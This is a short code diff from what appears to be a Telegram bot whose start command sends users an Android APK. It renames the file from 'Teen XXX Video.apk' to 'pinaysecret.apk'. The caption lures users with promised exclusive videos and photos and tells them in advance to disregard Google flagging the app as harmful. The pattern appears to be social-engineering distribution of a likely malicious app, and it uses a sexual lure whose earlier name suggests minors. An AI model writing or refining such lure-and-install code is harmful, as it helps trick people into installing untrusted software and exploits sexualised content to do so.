@@ -53,7 +53,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_user(user)
 
     await update.message.reply_document(
-        document=open("media/Teen XXX Video.apk", "rb"),
+        document=open("media/pinaysecret.apk", "rb"),
         caption=(
             "📥 *Download the App for Exclusive Videos & Photos!*\n\n"
             "⚠️ *Note:* Google may flag this as 'harmful' because it's not from the PlayStore. "
